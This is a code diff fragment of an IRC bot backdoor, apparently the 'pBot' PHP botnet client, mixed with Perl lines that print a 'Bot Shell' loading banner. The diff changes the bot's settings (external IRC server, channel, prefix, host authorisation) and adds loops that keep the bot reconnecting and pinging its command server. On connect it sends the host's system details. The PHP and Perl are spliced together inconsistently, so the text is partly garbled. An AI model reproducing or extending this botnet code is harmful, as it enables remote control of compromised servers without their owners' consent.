@@ -5,36 +5,44 @@
 
 #!/usr/bin/perl
 
-class pBot 
-{ 
- var $config = array("server"=>"irc.otherworlders.org",
-                     "port"=>"6667",
-                     "pass"=>"",
-                     "prefix"=>"BTTZ",
-                     "maxrand"=>"4",
-                     "chan"=>"#Owny",
-                     "chan2"=>"#",
-                     "key"=>"",
-                     "modes"=>"+p",
-                     "password"=>"4231",
-                     "trigger"=>".",
-                     "hostauth"=>"*" // * for any hostname (remember: /setvhost xdevil.org)
-                     );
+
+class pBot
+{
+ var $config = array("server"=>"irc.otherworlders.org", "port"=>"6667","key"=>"","prefix"=>"BTZ", "maxrand"=>"6", "chan"=>"#Owny","trigger"=>"-","hostauth"=>"BTZ.gov"); 
  var $users = array(); 
- function start() 
- { 
-    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
-       $this->start(); 
-    $ident = $this->config['prefix'];
-    $alph = range("0","9");
-    for($i=0;$i<$this->config['maxrand'];$i++) 
-       $ident .= $alph[rand(0,9)];
-    if(strlen($this->config['pass'])>0) 
-       $this->send("PASS ".$this->config['pass']);
-    $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
-    $this->set_nick();
-    $this->main();
- } 
+ function start()
+ {
+    while(true)
+	{
+	    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) $this->start(); 
+	    $ident = $this->config['prefix'];
+	    $alph = range("0","9");
+	    for($i=0;$i<$this->config['maxrand'];$i++) $ident .= $alph[rand(0,9)];
+	    $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
+	    $this->set_nick();
+	    $this->main();
+	}
+}
+ function main()
+ {
+    while(!feof($this->conn))
+    {
+	if(function_exists('stream_select'))
+	{
+	$read = array($this->conn);
+	$write = NULL;
+	$except = NULL;
+	$changed = stream_select($read, $write, $except, 30);
+	if($changed == 0)
+	{
+		fwrite($this->conn, "PING :lelcomeatme\r\n");
+		$read = array($this->conn);
+	        $write = NULL;
+	        $except = NULL;
+	        $changed = stream_select($read, $write, $except, 30);
+		if($changed == 0) break;
+	}
+	}
 my $success = "\n [+] Bot Shell\n [-] Loading Successfully ...\n [-] Process/PID : $fakeproc - $$\n\n";
 my $failed = "\n [?] perl $0 \n\n";
 
